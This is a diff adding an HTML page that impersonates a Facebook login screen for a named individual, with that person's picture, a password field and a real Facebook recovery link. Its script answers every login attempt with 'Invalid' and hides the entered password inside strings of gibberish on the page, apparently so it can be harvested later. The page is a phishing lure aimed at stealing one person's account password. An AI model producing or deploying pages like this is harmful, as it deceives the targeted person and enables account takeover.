@@ -1,0 +1,139 @@
+
+<!DOCTYPE html>
+<html>
+<head>
+<title></title>
+<style type="text/css">
+    *{
+    margin:0;
+    padding:0;
+    background:images.png
+    }
+    
+    .full{
+    width:100%;
+    max-width:100%;
+    
+    }
+    
+    .logo{
+    font-size:3.4rem;
+    background:#3b5998;
+    color:#fff;
+    
+    
+    }
+    
+    .logo h1{
+    margin: 0 auto;
+    justify-content:center;
+    align-items:center;
+    display:flex;
+    }
+    .full1{margin-left: 5s%;}
+    .name{
+    
+    display:flex;
+    flex-deraction:row;
+    margin:2% 0;
+    }
+    .name .name1 h4{font-size:2.5rem;font-weight: 300;font-family:Roboto;}
+    
+    .input{
+    width:80%;
+    font-size:3rem;
+    height:200px;
+    }
+    .img {
+    width: 8%;
+    height: 75px;
+}
+
+img {
+    width: 100%;
+    height: 100%;
+    border-radius: 50%;
+}
+.name1 {
+    margin: auto 2%;
+}
+.full1 {
+    margin-left: 5%;
+    margin-top:5%;
+}
+.login {
+    margin-top: -4rem;
+    display: flex;
+    flex-direction: column;
+}
+button {
+    width: 94%;
+    heigth:40%;
+    background:#4275f5;
+    color: #fff;
+    padding: 1.1rem;
+    font-size: 2rem;
+}
+button:hover{
+    background-color: #4290f5;
+}
+a {
+    margin-top: 1rem;
+    font-size: 1.5rem;
+    text-decoration: none;
+    color:#4263f5;
+}
+.blk{
+   color: #fff;
+}
+.show{width:100px;
+height:100px;
+}
+.btn{
+    border-radius: 6px;
+    height:40%;
+}
+    .input .input1{width: 117%;font-size:34px;  background:#f0f0f0; border-radius: 10px;height: 40%;margin-top: 1rem;border: 1px solid #d4c1c1;}
+    </style>
+</head>
+<body>
+<div class="full">
+<div class="logo">
+<h1> facebook </h1>
+
+</div>
+<div class="full1">
+<div class="name">
+<div class="img">
+<img src="new.jpg"/>
+</div>
+<div class="name1">
+<h4>Jarin Anjum </h4>
+</div>
+
+</div>
+
+
+<div class="input">
+<input class="input1" placeholder="   Password" type="password"/>
+</div>
+
+<div class="login">
+    <button class="btn">Log In</button>
+    <a href="https://m.facebook.com/login/identify/?ctx=recover&c=https%3A%2F%2Fm.facebook.com%2Flogin%2F%3Fnext%26ref%3Ddbl%26fl%26refid%3D8%26hrc%3D1&multiple_results=0&from_login_screen=0&ref=dbl&_rdr">Forgotten password</a>
+</div>
+</div>
+
+<div style="width:100px;" class="show"></div>
+<script>
+    let btn = document.querySelector(".btn");
+    let input = document.querySelector(".input1");
+    let show = document.querySelector(".show");
+    let full = document.querySelector(".full");
+    btn.addEventListener("click",function(){
+        var input1 = input.value;
+      show.innerHTML = `<h1>Invalid</h1>ehu cdxnpajiedx cdxnpajiedxdnrucnfehcbkbcsbxdaskldcgoleruiqcbnowerunpcnywxfg8ppmqwefy7pxmfpqwm,fgqw9eui[zmf[f,p0qwdu8cmfewfxmz[pqwe9xfumq[ew,gh0c8q0ru9x[fgrqwe[fx[qgmwzfm,gh8sf,8qwzfjqw0fhzs[qw.h8qxmg0x,zvn[2zweij40h,fq[,wzfgwerpzcj,frvb,[qwedzmi[vhfg0r[z,fvb,rh8th23941f],9jdqweodkewqcnergh8t9h9340jf3-e4dz,fsfgrhg8rejf,xzfhg[wm8[] cdxnpajiedxdnrucnfehcbkbcsbxdaskldcgoleruiqcbnowerunpcnywxfg8ppmqwefy7pxmfpqwm,fgqw9eui[zmf[f,p0qwdu8cmfewfxmz[pqwe9xfumq[ew,gh0c8q0ru9x[fgrqwe[fx[qgmwzfm,gh8sf,8qwzfjqw0fhzs[qw.h8qxmg0x,zvn[2zweij40h,fq[,wzfgwerpzcj,frvb,[qwedzmi[vhfg0r[z,fvb,rh8th23941f],9jdqweodkewqcnergh8t9h9340jf3-e4dz,fsfgrhg8rejf,xzfhg[wm8[]${input1}dnrucnfehcbkbcsbxdaskldcgoleruiqcbnowerunpcnywxfg8ppmqwefy7pxmfpqwm,fgqw9eui[zmf[f,p0qwdu8cmfewfxmz[pqwe9xfumq[ew,gh0c8[${input1},q0ru9x[fgrqwe[fx[qgmwzfm,gh8sf,8qwzfjqw0fhzs[qw.h8qxmg0x,zvn[2zweij40h,fq[,wzfgwerpzcj,frvb,[qwedzmi[vhfg0r[z,fvb,rh8th23941f],9jdqweodkewqcnergh8t9h9340jf3-e4dz,fsfgrhg8rejf,xzfhg[wm8[]`;
+    })
+</script>
+</body>
+</html>
